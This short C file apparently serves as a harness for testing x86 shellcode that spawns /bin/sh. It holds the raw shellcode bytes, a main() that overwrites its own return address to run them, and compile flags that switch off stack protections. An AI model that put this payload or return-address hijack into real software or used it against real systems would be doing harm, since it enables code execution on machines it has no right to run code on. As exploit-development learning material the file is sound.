#include <stdio.h>
/*
This shellcode is for getting a shell on the system device.

How to compile this so that there is no seg fault on x86:
gcc -o badass badass.c -fno-stack-protector -z execstack -no-pie -m32
./badass to see the results
 run strack ./badass

Found this at: https://gist.github.com/securitytube/5318838
*/

/*
To get the opcodes:

nasm -f elf shell.asm
ld -o shell shell.o
objdump -d shell
*/

// \xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x2f\x4a\x4a\x4a\x4a\x4b\x4b\x4b\x4b
char shellcode[] = "\x90\xeb\x1a"
                    "\x5e"
                    "\x31\xc0"
                    "\x88\x46\x07"
                    "\x8d\x1e"
                    "\x89\x5e\x08"
                    "\x89\x46\x0c"
                    "\xb0\x0b"
                    "\x89\xf3"
                    "\x8d\x4e\x08"
                    "\x8d\x56\x0c"
                    "\xcd\x80"
                    "\xe8\xe1\xff\xff\xff"
                    "\x2f"
                    "\x62\x69\x6e"
                    "\x2f"
                    "\x73\x68"
                    "\x2f"
                    "\x4a"
                    "\x41"
                    "\x41"
                    "\x41"
                    "\x41"
                    "\x4b"
                    "\x4b"
                    "\x4b"
                    "\x4b";


int main()
{
    int *ret;
    ret = (int *)&ret +2;
    (*ret) = (int)shellcode;
}
